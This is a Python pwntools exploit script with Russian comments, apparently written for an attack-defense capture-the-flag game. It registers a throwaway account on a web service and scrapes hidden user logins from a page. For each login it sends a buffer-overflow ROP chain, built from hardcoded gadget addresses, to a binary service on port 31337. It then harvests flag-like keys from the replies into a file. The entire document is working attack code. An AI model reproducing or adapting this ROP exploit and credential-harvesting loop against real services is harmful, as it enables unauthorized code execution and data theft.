from pwn import *
import re
from Crypto.Cipher import ChaCha20
import sys
import os
import requests
from bs4 import BeautifulSoup
from faker import Faker

HOST = "172.19.0.4" # sys.argv[1] # 3 or 4
HOST_2 = "172.19.0.1"
URL_REGISTER = f"http://{HOST}:5000/register"
URL_LOGIN = f"http://{HOST}:5000/login"
URL_USERS = f"http://{HOST}:5000/users"
PORT = 31337       
      
KEY_PATTERN = re.compile(rb"[A-Z0-9]{31}=") #compile(rb"TEAM\d{3}_[A-Z0-9]{32}")
KEYS_FILE = "found_keys.txt"

def load_keys():
    if os.path.exists(KEYS_FILE):
        with open(KEYS_FILE, "r") as f:
            return set(line.strip() for line in f)
    return set()

def save_key(key):
    with open(KEYS_FILE, "a") as f:
        f.write(key + "\n")

def send_and_receive(login: str) -> bytes:
    try:
        # Смещение
        offset = 0x90 + 8

        login_global = 0x0000000000404160   #login
        gat_init = 0x0000000000401520
        gat_pop = 0x0000000000401524
        gat_mov = 0x0000000000401526 # mov [rsi+rdi*8], rax
        gat_inc = 0x000000000040152B
        get_mes = 0x00000000004018B6
        # Формируем полезную нагрузку
        # payload = cyclic(300)
        name = login.encode() + b'\0' # наш логин, на который хотим подписаться
        payload = b"01\0"+ b"A" * (offset-3) 
        # gat

        payload += p64(gat_init)
        payload += p64(0)           #rdi
        payload += p64(login_global)#rsi 
        payload += p64(0)           #мусор

        for i in range(0, len(name), 8):
            batch = name[i:i+8]
            payload += p64(gat_pop) # pop rax
            payload += p64(int.from_bytes(batch, byteorder="little")) 
            payload += p64(gat_mov) 
            payload += p64(gat_inc) # на след ячейку

        payload += p64(gat_inc) # выранивание стека
        payload += p64(get_mes) 

        # Подключаемся к удалённому сервису
        p = remote(HOST_2, PORT)
        p.recvuntil("Введите токен (HEX):".encode('utf-8'))  # если сервис требует "токен"

        # Шлём наш ROP-пейлоад и имя
        p.sendline(payload)

        # Читаем результат выполнения get_mes()
        response = p.recvall(timeout=5)
        p.close()

        return response
    except Exception as e:
        print(f"[!] Ошибка при получении ответа: {e}")
        p.close()
        return b""

def search_keys(data: bytes):
    return KEY_PATTERN.findall(data)

def _gen_user():
    faker = Faker()
    username = faker.user_name()
    password = faker.password(length=4)
    name = faker.first_name()
    surname = faker.last_name()
    return username, password, name, surname

def _register_and_login(session, username, password, name, surname):
    # Регистрация
    r = session.post(
        URL_REGISTER,
        data={"login": username, "password": password, "name": name, "surname": surname},
        allow_redirects=False,
        timeout=5
    )
    if r.status_code != 302 or r.headers.get("Location") != "/login":
        print("[!] Ошибка при регистрации")
        return False

    # Логин
    r = session.post(
        URL_LOGIN,
        data={"login": username, "password": password},
        allow_redirects=False,
        timeout=5
    )
    if r.status_code != 302 or "session" not in session.cookies:
        print("[!] Ошибка при логине")
        return False
    
    return True

def find_logins():
    s = requests.Session()
    username, password, name, surname = _gen_user()
    print(username, password, name, surname)
    if not _register_and_login(s, username, password, name, surname):
        return []

    try:
        r = s.get(URL_USERS, timeout=5)
    except Exception as e:
        print(f"[!] Ошибка при загрузке /users: {e}")
        return []

    soup = BeautifulSoup(r.text, 'html.parser')
    
    hidden_div = soup.find("div", {"style": "display:none"})
    if hidden_div:
        # Получаем текст из div и разбиваем его по запятым
        users_text = hidden_div.text.strip()
        logins = [login.strip() for login in users_text.split(",") if login.strip()]
        return logins

    return []


def main():
    print("found keys")
    set_key = load_keys()
    print("found login")
    LOGINS = find_logins()
    print(LOGINS)
    context.log_level = 'error'  # Отключаем лишний вывод от pwntools
    
    for login in LOGINS[-30:]:
        print(f'[+] Проверка логина: {login} переходим на ROP')
        response = send_and_receive(login) 

        if not response:
            print('Нет ответа или ошибка\n')
            continue
        print(f"Ответ сервера: {response.decode(errors='ignore')}")
        keys = search_keys(response)
        if keys:
            for key in keys:
                key_str = key.decode()
                if not key_str in set_key:
                    #set_key.add(key_str)
                    save_key(key_str)
                    print(f'Найден ключ: {key_str}\n')
        else:
            print('Ключ не найден\n')

if __name__ == '__main__':
    main()

